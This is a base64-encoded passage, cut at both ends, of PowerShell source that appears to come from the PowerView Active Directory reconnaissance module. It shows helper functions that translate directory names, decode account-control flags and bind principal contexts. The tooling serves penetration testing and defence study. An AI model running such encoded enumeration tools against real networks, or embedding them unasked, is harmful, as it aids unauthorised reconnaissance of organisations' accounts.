BvbmUgb3IgbW9yZSBvYmplY3RzIG5hbWUgc3RyaW5ncyBvbiB0aGUgcGlwZWxpbmUuCgouT1VUUFVUUwoKU3RyaW5nCgpPdXRwdXRzIGEgc3RyaW5nIHJlcHJlc2VudGluZyB0aGUgY29udmVydGVkIG5hbWUuCgouTElOSwoKaHR0cDovL3dpbmRvd3NpdHByby5jb20vYWN0aXZlLWRpcmVjdG9yeS90cmFuc2xhdGluZy1hY3RpdmUtZGlyZWN0b3J5LW9iamVjdC1uYW1lcy1iZXR3ZWVuLWZvcm1hdHMKaHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9zY3JpcHRjZW50ZXIvVHJhbnNsYXRpbmctQWN0aXZlLTVjODBkZDY3CiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3RyaW5nXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ05hbWUnLCAnT2JqZWN0TmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTdHJpbmddCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdETicsICdDYW5vbmljYWwnLCAnTlQ0JywgJ0Rpc3BsYXknLCAnRG9tYWluU2ltcGxlJywgJ0VudGVycHJpc2VTaW1wbGUnLCAnR1VJRCcsICdVbmtub3duJywgJ1VQTicsICdDYW5vbmljYWxFeCcsICdTUE4nKV0KICAgICAgICAkT3V0cHV0VHlwZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJE5hbWVUeXBlcyA9IEB7CiAgICAgICAgICAgICdETicgICAgICAgICAgICAgICAgPSAgIDEgICMgQ049UGhpbmVhcyBGbHlubixPVT1FbmdpbmVlcnMsREM9ZmFicmlrYW0sREM9Y29tCiAgICAgICAgICAgICdDYW5vbmljYWwnICAgICAgICAgPSAgIDIgICMgZmFicmlrYW0uY29tL0VuZ2luZWVycy9QaGluZWFzIEZseW5uCiAgICAgICAgICAgICdOVDQnICAgICAgICAgICAgICAgPSAgIDMgICMgZmFicmlrYW1ccGZseW5uCiAgICAgICAgICAgICdEaXNwbGF5JyAgICAgICAgICAgPSAgIDQgICMgcGZseW5uCiAgICAgICAgICAgICdEb21haW5TaW1wbGUnICAgICAgPSAgIDUgICMgcGZseW5uQGZhYnJpa2FtLmNvbQogICAgICAgICAgICAnRW50ZXJwcmlzZVNpbXBsZScgID0gICA2ICAjIHBmbHlubkBmYWJyaWthbS5jb20KICAgICAgICAgICAgJ0dVSUQnICAgICAgICAgICAgICA9ICAgNyAgIyB7OTVlZTlmZmYtMzQzNi0xMWQxLWIyYjAtZDE1YWUzYWM4NDM2fQogICAgICAgICAgICAnVW5rbm93bicgICAgICAgICAgID0gICA4ICAjIHVua25vd24gdHlwZSAtIGxldCB0aGUgc2VydmVyIGRvIHRyYW5zbGF0aW9uCiAgICAgICAgICAgICdVUE4nICAgICAgICAgICAgICAgPSAgIDkgICMgcGZseW5uQGZhYnJpa2FtLmNvbQogICAgICAgICAgICAnQ2Fub25pY2FsRXgnICAgICAgID0gICAxMCAjIGZhYnJpa2FtLmNvbS9Vc2Vycy9QaGluZWFzIEZseW5uCiAgICAgICAgICAgICdTUE4nICAgICAgICAgICAgICAgPSAgIDExICMgSFRUUC9rYWlyb21hYy5jb250b3NvLmNvbQogICAgICAgICAgICAnU0lEJyAgICAgICAgICAgICAgID0gICAxMiAjIFMtMS01LTIxLTEyOTg2MjMxLTYwMDY0MTU0Ny03MDkxMjIyODgtNTc5OTkKICAgICAgICB9CgogICAgICAgICMgYWNjZXNzb3IgZnVuY3Rpb25zIGZyb20gQmlsbCBTdGV3YXJ0IHRvIHNpbXBsaWZ5IGNhbGxzIHRvIE5hbWVUcmFuc2xhdGUKICAgICAgICBmdW5jdGlvbiBJbnZva2UtTWV0aG9kKFtfX0NvbU9iamVjdF0gJE9iamVjdCwgW1N0cmluZ10gJE1ldGhvZCwgJFBhcmFtZXRlcnMpIHsKICAgICAgICAgICAgJE91dHB1dCA9ICROdWxsCiAgICAgICAgICAgICRPdXRwdXQgPSAkT2JqZWN0LkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJE1ldGhvZCwgJ0ludm9rZU1ldGhvZCcsICROVUxMLCAkT2JqZWN0LCAkUGFyYW1ldGVycykKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICRPdXRwdXQKICAgICAgICB9CgogICAgICAgIGZ1bmN0aW9uIEdldC1Qcm9wZXJ0eShbX19Db21PYmplY3RdICRPYmplY3QsIFtTdHJpbmddICRQcm9wZXJ0eSkgewogICAgICAgICAgICAkT2JqZWN0LkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJFByb3BlcnR5LCAnR2V0UHJvcGVydHknLCAkTlVMTCwgJE9iamVjdCwgJE5VTEwpCiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBTZXQtUHJvcGVydHkoW19fQ29tT2JqZWN0XSAkT2JqZWN0LCBbU3RyaW5nXSAkUHJvcGVydHksICRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgIFtWb2lkXSAkT2JqZWN0LkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJFByb3BlcnR5LCAnU2V0UHJvcGVydHknLCAkTlVMTCwgJE9iamVjdCwgJFBhcmFtZXRlcnMpCiAgICAgICAgfQoKICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvYWE3NzIyNjYlMjh2PXZzLjg1JTI5LmFzcHgKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICAkQURTSW5pdFR5cGUgPSAyCiAgICAgICAgICAgICRJbml0TmFtZSA9ICRTZXJ2ZXIKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRBRFNJbml0VHlwZSA9IDEKICAgICAgICAgICAgJEluaXROYW1lID0gJERvbWFpbgogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRDcmVkID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKQogICAgICAgICAgICAkQURTSW5pdFR5cGUgPSAxCiAgICAgICAgICAgICRJbml0TmFtZSA9ICRDcmVkLkRvbWFpbgogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyBpZiBubyBkb21haW4gb3Igc2VydmVyIGlzIHNwZWNpZmllZCwgZGVmYXVsdCB0byBHQyBpbml0aWFsaXphdGlvbgogICAgICAgICAgICAkQURTSW5pdFR5cGUgPSAzCiAgICAgICAgICAgICRJbml0TmFtZSA9ICROdWxsCiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRJZGVudGl0eSBpbiAkSWRlbnRpdHkpIHsKICAgICAgICAgICAgaWYgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydPdXRwdXRUeXBlJ10pIHsKICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0SWRlbnRpdHkgLW1hdGNoICJeW0EtWmEtel0rXFxbQS1aYS16IF0rIikgewogICAgICAgICAgICAgICAgICAgICRBRFNPdXRwdXRUeXBlID0gJE5hbWVUeXBlc1snRG9tYWluU2ltcGxlJ10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRBRFNPdXRwdXRUeXBlID0gJE5hbWVUeXBlc1snTlQ0J10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRBRFNPdXRwdXRUeXBlID0gJE5hbWVUeXBlc1skT3V0cHV0VHlwZV0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgJFRyYW5zbGF0ZSA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBOYW1lVHJhbnNsYXRlCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJENyZWQgPSAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpCgogICAgICAgICAgICAgICAgICAgIEludm9rZS1NZXRob2QgJFRyYW5zbGF0ZSAnSW5pdEV4JyAoCiAgICAgICAgICAgICAgICAgICAgICAgICRBRFNJbml0VHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJEluaXROYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAkQ3JlZC5Vc2VyTmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgJENyZWQuRG9tYWluLAogICAgICAgICAgICAgICAgICAgICAgICAkQ3JlZC5QYXNzd29yZAogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydC1BRE5hbWVdIEVycm9yIGluaXRpYWxpemluZyB0cmFuc2xhdGlvbiBmb3IgJyRJZGVudGl0eScgdXNpbmcgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzIDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLU1ldGhvZCAkVHJhbnNsYXRlICdJbml0JyAoCiAgICAgICAgICAgICAgICAgICAgICAgICRBRFNJbml0VHlwZSwKICAgICAgICAgICAgICAgICAgICAgICAgJEluaXROYW1lCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0LUFETmFtZV0gRXJyb3IgaW5pdGlhbGl6aW5nIHRyYW5zbGF0aW9uIGZvciAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGFsd2F5cyBjaGFzZSBhbGwgcmVmZXJyYWxzCiAgICAgICAgICAgIFNldC1Qcm9wZXJ0eSAkVHJhbnNsYXRlICdDaGFzZVJlZmVycmFsJyAoMHg2MCkKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAjIDggPSBVbmtub3duIG5hbWUgdHlwZSAtPiBsZXQgdGhlIHNlcnZlciBkbyB0aGUgd29yayBmb3IgdXMKICAgICAgICAgICAgICAgICROdWxsID0gSW52b2tlLU1ldGhvZCAkVHJhbnNsYXRlICdTZXQnICg4LCAkVGFyZ2V0SWRlbnRpdHkpCiAgICAgICAgICAgICAgICBJbnZva2UtTWV0aG9kICRUcmFuc2xhdGUgJ0dldCcgKCRBRFNPdXRwdXRUeXBlKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLk1ldGhvZEludm9jYXRpb25FeGNlcHRpb25dIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltDb252ZXJ0LUFETmFtZV0gRXJyb3IgdHJhbnNsYXRpbmcgJyRUYXJnZXRJZGVudGl0eScgOiAkKCRfLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIENvbnZlcnRGcm9tLVVBQ1ZhbHVlIHsKPCMKLlNZTk9QU0lTCgpDb252ZXJ0cyBhIFVBQyBpbnQgdmFsdWUgdG8gaHVtYW4gcmVhZGFibGUgZm9ybS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gd2lsbCB0YWtlIGFuIGludGVnZXIgdGhhdCByZXByZXNlbnRzIGEgVXNlciBBY2NvdW50CkNvbnRyb2wgKFVBQykgYmluYXJ5IGJsb2IgYW5kIHdpbGwgY292ZXJ0IGl0IHRvIGFuIG9yZGVyZWQKZGljdGlvbmFyeSB3aXRoIGVhY2ggYml0d2lzZSB2YWx1ZSBicm9rZW4gb3V0LiBCeSBkZWZhdWx0IG9ubHkgdmFsdWVzCnNldCBhcmUgZGlzcGxheWVkLSB0aGUgLVNob3dBbGwgc3dpdGNoIHdpbGwgZGlzcGxheSBhbGwgdmFsdWVzIHdpdGgKYSArIG5leHQgdG8gdGhlIG9uZXMgc2V0LgoKLlBBUkFNRVRFUiBWYWx1ZQoKU3BlY2lmaWVzIHRoZSBpbnRlZ2VyIFVBQyB2YWx1ZSB0byBjb252ZXJ0LgoKLlBBUkFNRVRFUiBTaG93QWxsCgpTd2l0Y2guIFNpZ25hbHMgQ29udmVydEZyb20tVUFDVmFsdWUgdG8gZGlzcGxheSBhbGwgVUFDIHZhbHVlcywgd2l0aCBhICsgaW5kaWNhdGluZyB0aGUgdmFsdWUgaXMgY3VycmVudGx5IHNldC4KCi5FWEFNUExFCgpDb252ZXJ0RnJvbS1VQUNWYWx1ZSAtVmFsdWUgNjYxNzYKCk5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICBWYWx1ZQotLS0tICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0KRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQgICAgIDEyOApOT1JNQUxfQUNDT1VOVCAgICAgICAgICAgICAgICAgNTEyCkRPTlRfRVhQSVJFX1BBU1NXT1JEICAgICAgICAgICA2NTUzNgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIGhhcm1qMHkgfCBDb252ZXJ0RnJvbS1VQUNWYWx1ZQoKTmFtZSAgICAgICAgICAgICAgICAgICAgICAgICAgIFZhbHVlCi0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAtLS0tLQpOT1JNQUxfQUNDT1VOVCAgICAgICAgICAgICAgICAgNTEyCkRPTlRfRVhQSVJFX1BBU1NXT1JEICAgICAgICAgICA2NTUzNgoKLkVYQU1QTEUKCkdldC1Eb21haW5Vc2VyIGhhcm1qMHkgfCBDb252ZXJ0RnJvbS1VQUNWYWx1ZSAtU2hvd0FsbAoKTmFtZSAgICAgICAgICAgICAgICAgICAgICAgICAgIFZhbHVlCi0tLS0gICAgICAgICAgICAgICAgICAgICAgICAgICAtLS0tLQpTQ1JJUFQgICAgICAgICAgICAgICAgICAgICAgICAgMQpBQ0NPVU5URElTQUJMRSAgICAgICAgICAgICAgICAgMgpIT01FRElSX1JFUVVJUkVEICAgICAgICAgICAgICAgOApMT0NLT1VUICAgICAgICAgICAgICAgICAgICAgICAgMTYKUEFTU1dEX05PVFJFUUQgICAgICAgICAgICAgICAgIDMyClBBU1NXRF9DQU5UX0NIQU5HRSAgICAgICAgICAgICA2NApFTkNSWVBURURfVEVYVF9QV0RfQUxMT1dFRCAgICAgMTI4ClRFTVBfRFVQTElDQVRFX0FDQ09VTlQgICAgICAgICAyNTYKTk9STUFMX0FDQ09VTlQgICAgICAgICAgICAgICAgIDUxMisKSU5URVJET01BSU5fVFJVU1RfQUNDT1VOVCAgICAgIDIwNDgKV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCAgICAgIDQwOTYKU0VSVkVSX1RSVVNUX0FDQ09VTlQgICAgICAgICAgIDgxOTIKRE9OVF9FWFBJUkVfUEFTU1dPUkQgICAgICAgICAgIDY1NTM2KwpNTlNfTE9HT05fQUNDT1VOVCAgICAgICAgICAgICAgMTMxMDcyClNNQVJUQ0FSRF9SRVFVSVJFRCAgICAgICAgICAgICAyNjIxNDQKVFJVU1RFRF9GT1JfREVMRUdBVElPTiAgICAgICAgIDUyNDI4OApOT1RfREVMRUdBVEVEICAgICAgICAgICAgICAgICAgMTA0ODU3NgpVU0VfREVTX0tFWV9PTkxZICAgICAgICAgICAgICAgMjA5NzE1MgpET05UX1JFUV9QUkVBVVRIICAgICAgICAgICAgICAgNDE5NDMwNApQQVNTV09SRF9FWFBJUkVEICAgICAgICAgICAgICAgODM4ODYwOApUUlVTVEVEX1RPX0FVVEhfRk9SX0RFTEVHQVRJT04gMTY3NzcyMTYKUEFSVElBTF9TRUNSRVRTX0FDQ09VTlQgICAgICAgIDY3MTA4ODY0CgouSU5QVVRTCgpJbnQKCkFjY2VwdHMgYW4gaW50ZWdlciByZXByZXNlbnRpbmcgYSBVQUMgYmluYXJ5IGJsb2IuCgouT1VUUFVUUwoKU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5CgpBbiBvcmRlcmVkIGRpY3Rpb25hcnkgd2l0aCB0aGUgY29udmVydGVkIFVBQyBmaWVsZHMuCgouTElOSwoKaHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMva2IvMzA1MTQ0CiM+CgogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdVQUMnLCAndXNlcmFjY291bnRjb250cm9sJyldCiAgICAgICAgW0ludF0KICAgICAgICAkVmFsdWUsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNob3dBbGwKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgIyB2YWx1ZXMgZnJvbSBodHRwczovL3N1cHBvcnQubWljcm9zb2Z0LmNvbS9lbi11cy9rYi8zMDUxNDQKICAgICAgICAkVUFDVmFsdWVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiU0NSSVBUIiwgMSkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiQUNDT1VOVERJU0FCTEUiLCAyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJIT01FRElSX1JFUVVJUkVEIiwgOCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiTE9DS09VVCIsIDE2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJQQVNTV0RfTk9UUkVRRCIsIDMyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJQQVNTV0RfQ0FOVF9DSEFOR0UiLCA2NCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiRU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQiLCAxMjgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlRFTVBfRFVQTElDQVRFX0FDQ09VTlQiLCAyNTYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIk5PUk1BTF9BQ0NPVU5UIiwgNTEyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJJTlRFUkRPTUFJTl9UUlVTVF9BQ0NPVU5UIiwgMjA0OCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiV09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVCIsIDQwOTYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlNFUlZFUl9UUlVTVF9BQ0NPVU5UIiwgODE5MikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiRE9OVF9FWFBJUkVfUEFTU1dPUkQiLCA2NTUzNikKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiTU5TX0xPR09OX0FDQ09VTlQiLCAxMzEwNzIpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlNNQVJUQ0FSRF9SRVFVSVJFRCIsIDI2MjE0NCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiVFJVU1RFRF9GT1JfREVMRUdBVElPTiIsIDUyNDI4OCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiTk9UX0RFTEVHQVRFRCIsIDEwNDg1NzYpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlVTRV9ERVNfS0VZX09OTFkiLCAyMDk3MTUyKQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJET05UX1JFUV9QUkVBVVRIIiwgNDE5NDMwNCkKICAgICAgICAkVUFDVmFsdWVzLkFkZCgiUEFTU1dPUkRfRVhQSVJFRCIsIDgzODg2MDgpCiAgICAgICAgJFVBQ1ZhbHVlcy5BZGQoIlRSVVNURURfVE9fQVVUSF9GT1JfREVMRUdBVElPTiIsIDE2Nzc3MjE2KQogICAgICAgICRVQUNWYWx1ZXMuQWRkKCJQQVJUSUFMX1NFQ1JFVFNfQUNDT1VOVCIsIDY3MTA4ODY0KQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICRSZXN1bHRVQUNWYWx1ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQoKICAgICAgICBpZiAoJFNob3dBbGwpIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFVBQ1ZhbHVlcy5BZGQoJFVBQ1ZhbHVlLk5hbWUsICIkKCRVQUNWYWx1ZS5WYWx1ZSkrIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRVQUNWYWx1ZXMuQWRkKCRVQUNWYWx1ZS5OYW1lLCAiJCgkVUFDVmFsdWUuVmFsdWUpIikKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgRm9yRWFjaCAoJFVBQ1ZhbHVlIGluICRVQUNWYWx1ZXMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICBpZiAoICgkVmFsdWUgLWJhbmQgJFVBQ1ZhbHVlLlZhbHVlKSAtZXEgJFVBQ1ZhbHVlLlZhbHVlKSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdFVBQ1ZhbHVlcy5BZGQoJFVBQ1ZhbHVlLk5hbWUsICIkKCRVQUNWYWx1ZS5WYWx1ZSkiKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRSZXN1bHRVQUNWYWx1ZXMKICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1QcmluY2lwYWxDb250ZXh0IHsKPCMKLlNZTk9QU0lTCgpIZWxwZXIgdG8gdGFrZSBhbiBJZGVudGl0eSBhbmQgcmV0dXJuIGEgRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuUHJpbmNpcGFsQ29udGV4dAphbmQgc2ltcGxpZmllZCBpZGVudGl0eS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIGdyb3VwIFNhbUFjY291bnROYW1lIChlLmcuIEdyb3VwMSksIERpc3Rpbmd1aXNoZWROYW1lIChlLmcuIENOPWdyb3VwMSxDTj1Vc2VycyxEQz10ZXN0bGFiLERDPWxvY2FsKSwKU0lEIChlLmcuIFMtMS01LTIxLTg5MDE3MTg1OS0zNDMzODA5Mjc5LTMzNjYxOTY3NTMtMTExNCksIG9yIEdVSUQgKGUuZy4gNGM0MzVkZDctZGM1OC00YjE0LTlhNWUtMWZkYjBlODBkMjAyKSwKb3IgYSBET01BSU5cdXNlcm5hbWUgaWRlbnRpdHkuCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gdXNlIHRvIHNlYXJjaCBmb3IgdXNlci9ncm91cCBwcmluY2lwYWxzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwSWRlbnRpdHknKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50CgogICAgdHJ5IHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSAtb3IgKCRJZGVudGl0eSAtbWF0Y2ggJy4rXFwuKycpKSB7CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHkgLW1hdGNoICcuK1xcLisnKSB7CiAgICAgICAgICAgICAgICAjIERPTUFJTlxncm91cG5hbWUKICAgICAgICAgICAgICAgICRDb252ZXJ0ZWRJZGVudGl0eSA9ICRJZGVudGl0eSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgaWYgKCRDb252ZXJ0ZWRJZGVudGl0eSkgewogICAgICAgICAgICAgICAgICAgICRDb25uZWN0VGFyZ2V0ID0gJENvbnZlcnRlZElkZW50aXR5LlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHkuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RJZGVudGl0eSA9ICRJZGVudGl0eS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1QcmluY2lwYWxDb250ZXh0XSBCaW5kaW5nIHRvIGRvbWFpbiAnJENvbm5lY3RUYXJnZXQnIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJE9iamVjdElkZW50aXR5ID0gJElk